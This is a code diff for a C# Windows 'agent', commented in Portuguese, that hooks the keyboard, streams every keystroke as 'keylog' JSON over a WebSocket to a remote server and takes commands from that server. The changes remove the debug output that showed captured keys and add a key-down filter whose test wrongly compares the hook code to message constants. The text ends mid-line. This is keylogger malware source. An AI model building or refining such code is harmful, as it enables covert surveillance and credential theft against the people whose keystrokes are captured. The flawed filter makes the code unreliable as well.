@@ -40,6 +40,7 @@ internal static class Program
 
         Console.WriteLine($"[INFO] Iniciando Agente... ID: {agentId}");
 
+        // Instalando o Hook com o filtro de mensagens corrigido internamente
         KeyboardHook.Install(async (k, d) => {
             if (state.Socket?.State == WebSocketState.Open) {
                 await SendKeylog(state.Socket, sendGate, k, d);
@@ -76,7 +77,6 @@ internal static class Program
 
     static async Task SendKeylog(ClientWebSocket s, SemaphoreSlim g, string k, bool d) {
         try { 
-            Console.WriteLine($"[DEBUG KEY] Tecla: {k} | Down: {d}"); 
             var payload = new { 
                 type = "keylog", 
                 key = k, 
@@ -84,7 +84,6 @@ internal static class Program
                 ts = DateTime.UtcNow.ToString("HH:mm:ss") 
             };
             await SendJsonAsync(s, g, payload); 
-            Console.WriteLine($"[DEBUG KEY] Enviado para o servidor: {k}");
         } catch (Exception ex) { 
             Console.WriteLine($"[ERRO KEYLOG] {ex.Message}"); 
         }
@@ -108,8 +107,6 @@ internal static class Program
                 var root = doc.RootElement;
                 if (!root.TryGetProperty("type", out var tp)) continue;
                 var type = tp.GetString();
-
-                Console.WriteLine($"[INFO] Comando recebido do servidor: {type}");
 
                 switch (type) {
                     case "access_request":
@@ -258,8 +255,14 @@ public class KeyboardHook {
     [DllImport("user32.dll")] private static extern bool UnhookWindowsHookEx(IntPtr h);
     [DllImport("user32.dll")] private static extern IntPtr CallNextHookEx(IntPtr h, int n, IntPtr w, IntPtr l);
     [DllImport("kernel32.dll")] private static extern IntPtr GetModuleHandle(string n);
-    private const int WH_KEYBOARD_LL = 13, WM_KEYDOWN = 0x0100, WM_SYSKEYDOWN = 0x0104;
-    private static IntPtr _h = IntPtr.Zero; private static LowLevelKeyboardProc? _p; private static Func<string, bool, Task>? _cb;
+
+    private const int WH_KEYBOARD_LL = 13;
+    private const int WM_KEYDOWN = 0x0100;
+    private const int WM_SYSKEYDOWN = 0x0104;
+
+    private static IntPtr _h = IntPtr.Zero; 
+    private static LowLevelKeyboardProc? _p; 
+    private static Func<string, bool, Task>? _cb;
 
     public static void Install(Func<string, bool, Task> callback) { 
         _cb = callback; 
@@ -274,13 +277,17 @@ public class KeyboardHook {
     }
 
     private static IntPtr Proc(int n, IntPtr w, IntPtr l) {
-        if (n >= 0 && _cb != null) {
-            int vkCode = Marshal.ReadInt32(l);
-            string key = ((Keys)vkCode).ToString();
-            Task.Run(async () => {
-                try { await _cb(key, true); } catch { }
-            });
+        // CORREÇÃO: Só processa se for o evento de tecla pressionada (Down)
+        // Isso evita capturar o evento de tecla solta (Up), que causava a duplicidade.
+        if (n == WM_KEYDOWN || n == WM_SYSKEYDOWN) {
+            if (_cb != null) {
+                int vkCode = Marshal.ReadInt32(l);
+                string key = ((Keys)vkCode).ToString();
+                
+                // Executa de forma assíncrona para não travar a thread do sistema
+                _ = Task.Run(async () => {
+                    try { await _cb(key, true); } catch { }
+                });
+            }
         }
-        return CallNextHookEx(_h, n, w, l);
-    }
-}
+        return CallNextHookEx(_h, n, w
